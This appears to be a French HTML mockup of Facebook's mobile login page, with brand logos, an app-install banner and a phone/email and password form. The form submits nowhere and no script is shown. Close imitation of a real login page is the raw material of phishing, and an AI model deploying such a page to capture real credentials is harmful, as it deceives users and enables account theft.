<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à Facebook</title>
    <link rel="stylesheet" href="style.css">
    <!-- FontAwesome pour l'icône Meta -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>

    <!-- Barre supérieure d'ouverture d'application -->
    <div class="top-app-bar">
        <div class="app-info">
            <div class="fb-mini-logo"><i class="fa-brands fa-facebook-f"></i></div>
            <div class="app-texts">
                <span class="app-title">Facebook</span>
                <span class="app-subtitle">Ouvrir dans l'app Facebook</span>
            </div>
        </div>
        <button class="btn-ouvrir">OUVRIR</button>
    </div>
    <br>
    <!-- Bannière d'installation iOS -->
    <div class="ios-banner">
        <i class="fa-solid fa-arrow-down"></i> Installez Facebook pour mobile et naviguez plus vite.
    </div>

    <!-- Contenu principal -->
    <div class="main-container">
        
        <!-- Sélecteur de langue -->
        <div class="language-selector">
            Français (France)
        </div>
        <br>
        <!-- Logo Facebook principal -->
        <div class="fb-logo-container">
            <div class="fb-circle-logo">
                <i class="fa-brands fa-facebook-f"></i>
            </div>
        </div>
        <br>
        <!-- Formulaire de connexion -->
        <form class="login-form">
            <div class="input-group">
                <input type="text" placeholder="Numéro mobile ou e-mail" required>
            </div>
            <div class="input-group">
                <input type="password" placeholder="Mot de passe" required>
            </div>
            <button type="submit" class="btn-login">Se connecter</button>
        </form>

        <!-- Lien mot de passe oublié -->
        <div class="forgot-password">
            <a href="#">Mot de passe oublié ?</a>
        </div>
        
        <!-- Séparateur / Espace flexible -->
        <div class="spacer"></div>
        <br>
        <!-- Bouton créer un compte -->
        <div class="create-account-container">
            <button class="btn-create">Créer un nouveau compte</button>
        </div>

        <!-- Footer Meta & Liens -->
        <div class="footer">
            <div class="meta-logo">
                <i class="logo-meta"><img src="meta.jpg"></i>
                <i>Meta</i>
            </div>
            <div class="footer-links">
                <a href="#">À propos</a>
                <a href="#">Aide</a>
                <a href="#">Plus</a>
            </div>
        </div>

    </div>

</body>
</html>
